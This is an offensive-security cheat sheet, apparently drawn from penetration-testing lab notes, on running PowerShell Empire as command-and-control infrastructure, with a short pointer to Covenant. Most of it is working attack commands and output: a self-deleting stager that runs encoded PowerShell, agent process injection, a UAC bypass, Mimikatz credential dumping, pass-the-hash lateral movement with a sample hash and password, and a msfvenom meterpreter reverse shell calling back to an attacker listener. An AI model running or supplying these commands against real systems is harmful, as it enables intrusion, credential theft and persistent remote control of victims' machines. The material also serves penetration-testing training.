# C2 (Command & Control)

## Powershell Empire

```bash
cd /opt
sudo git clone https://github.com/PowerShellEmpire/Empire.git
cd Empire/
sudo ./setup/install.sh
# Press enter to generate a random password
sudo ./empire
```

{% code overflow="wrap" fullWidth="true" %}
```bash
https://github.com/EmpireProject/Empire
https://www.harmj0y.net/blog/empyre/building-an-empyre-with-python/
https://github.com/BC-SECURITY/Empire
https://github.com/BC-SECURITY/Empire/tree/dev
Empire is a "PowerShell and Python post-exploitation agent" with a heavy focus on client-side exploitation and post-exploitation of Active Directory (AD) deployments.

https://hakshop.com/products/usb-rubber-ducky-deluxe
# Listeners
listeners
uselistener
uselistener http
info
set Host 10.11.0.4
set Port 22
execute
# Stagers/payloads
usestager
usestager windows/launcher_bat
# Set listener for a stager
Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute
[*] Stager output written out to: /tmp/launcher.bat
kali@kali:/opt/Empire$ cat /tmp/launcher.bat 
@echo off
start /b powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBp...
start /b "" cmd /c del "%~f0"&exit /b
# Agents
An agent is simply the final payload retrieved by the stager, and it allows us to execute commands and interact with the system. 
After execution of launcher.bat, an initial agent appears:
(Empire: stager/windows/launcher_bat) > [+] Initial agent S2Y5XW1L from 10.11.0.22 now active (Slack)
(Empire: stager/windows/launcher_bat) > agents
[*] Active agents:
Name       Lang  Internal IP  Machine Name  Username     Process             Delay
---------  ----  -----------  ------------  ---------    -------             -----
S2Y5XW1L   ps    10.11.0.22   CLIENT251     corp\offsec  powershell/2976     5/0.0
# interact command followed by the agent name to interact with our agent and execute commands
(Empire: agents) > interact S2Y5XW1L
(Empire: S2Y5XW1L) > sysinfo
# Migrate process
(Empire: S2Y5XW1L) > ps
(Empire: S2Y5XW1L) > psinject http $PID
# the original Empire agent remains active and we must manually switch to the newly created agent
agents
interact 2GMB873Z
(Empire: 2GMB873Z) > shell cat /home/file
[*] Tasked 2GMB873Z to run TASK_SHELL
[*] Agent 2GMB873Z tasked with task ID 3
(Empire: 2GMB873Z) > 
This is a file
 ..Command execution completed.
 
# Modules
https://github.com/PowerShellEmpire/PowerTools
https://github.com/BloodHoundAD/BloodHound
https://neo4j.com/blog/bloodhound-how-graphs-changed-the-way-hackers-attack/
https://www.powershellempire.com/?page_id=378
https://github.com/stephenfewer/ReflectiveDLLInjection
(Empire:2Y5XW1L) > usemodule situational_awareness/network/powerview/get_user
(powershell/situational_awareness/network/powerview/get_user) > info
...
If the NeedsAdmin field is set to "True", the script requires local Administrator permissions. If the OpsecSafe field is set to "True", the script will avoid leaving behind indicators of compromise, such as temporary disk files or new user accounts. This stealth-driven approach has a greater likelihood of evading endpoint protection mechanisms.
Background tells us if the module executes in the background without visibility for the victim, while OutputExtension tells us the output format if the module returns output to a file.
> (powershell/situational_awareness/network/powerview/get_user) > execute
# Adding credentials into credential store
creds add corp.com jeff_admin Qwerty09!

# Switching Between Empire and Metasploit
If a PowerShell Empire agent is active on the host, we can use msfvenom to generate a meterpreter reverse shell as an executable.
msfvenom -p windows/meterpreter/reverse_http LHOST=10.11.0.4 LPORT=7777 -f exe -o met.exe
# Set Meterpreter listener
msf5 > use multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf5 exploit(multi/handler) > set LPORT 7777
LPORT => 7777
msf5 exploit(multi/handler) > set LHOST 10.11.0.4
LHOST => 10.11.0.4
msf5 exploit(multi/handler) > exploit
[*] Started HTTP reverse handler on http://10.11.0.4:7777
# Now we switch back to our PowerShell Empire shell and upload the executable to execute it
Empire: S2Y5XW1L) > upload /home/kali/met.exe
[*] Tasked agent to upload met.exe, 72 KB
[*] Tasked S2Y5XW1L to run TASK_UPLOAD
[*] Agent S2Y5XW1L tasked with task ID 12
[*] Agent S2Y5XW1L returned results.
[*] Valid results returned by 10.11.0.22
(Empire: S2Y5XW1L) > shell C:\Users\offsec.corp\Downloads>met.exe
[*] Tasked S2Y5XW1L to run TASK_SHELL
[*] Agent S2Y5XW1L tasked with task ID 5
[*] Agent S2Y5XW1L returned results.
..Command execution completed.
[*] Valid results returned by 10.11.0.22 
# Then we get a Meterpreter connection
[*] Started HTTP reverse handler on http://10.11.0.4:7777
[*] http://10.11.0.4:7777 handling request from 10.11.0.22; Staging x86 payload (18082
[*] Meterpreter session 1 opened (10.11.0.4:7777 -> 10.11.0.22:50597)
meterpreter>
# To switch back to Empire 
(Empire: listeners) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute
[*] Stager output written out to: /tmp/launcher.bat
meterpreter > upload /tmp/launcher.bat
[*] uploading  : /tmp/launcher.bat -> launcher.bat
[*] Uploaded 4.69 KiB of 4.69 KiB (100.0%): /tmp/launcher.bat -> launcher.bat
[*] uploaded   : /tmp/launcher.bat -> launcher.bat
meterpreter > shell
Process 4644 created.
Channel 2 created.
C:\Users\offsec.corp\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9E6A-47F8
 Directory of C:\Users\offsec.corp\Downloads
09/19/2019  08:42 AM    <DIR>          .
09/19/2019  08:42 AM    <DIR>          ..
09/19/2019  08:42 AM             4,802 launcher.bat
               1 File(s)         4,802 bytes
               2 Dir(s)   2,022,359,040 bytes free
C:\Users\offsec.corp\Downloads>launcher.bat
launcher.bat
Now we should receive an Empire agent from the compromised host:
(Empire: agents) > [+] Initial agent LEBYRW67 from 10.11.0.22 now active (Slack)
```
{% endcode %}

### Powershell Modules

```bash
(Empire: S2Y5XW1L) > usemodule
                usemodule situational_awareness/network/powerview/get_user
                execute

# CREDENTIALS AND PRIVILEGE ESCALATION
                usemodule powershell/privesc/powerup/allchecks
                execute
                usemodule privesc/bypassuac_fodhelper
                set Listener http
                execute
                y
                interact $AGENT
                usemodule credentials/mimikatz/logonpasswords
                execute
                mimikatz(powershell) sekurlsa::logonpasswords
                creds

# LATERAL MOVEMENT
(Empire: K678VC13) > usemodule lateral_movement/invoke_smbexec 
                set ComputerName client251
                set Listener http
                set Username jeff_admin
                set Hash e2b475c11da2a0748290d87aa966c327
                set Domain corp.com
                execute
                agents
                interact $AGENT 
                
```

## Covenant

{% embed url="https://github.com/cobbr/Covenant" %}

{% embed url="https://github.com/cobbr/Covenant/wiki/Installation-And-Startup" %}
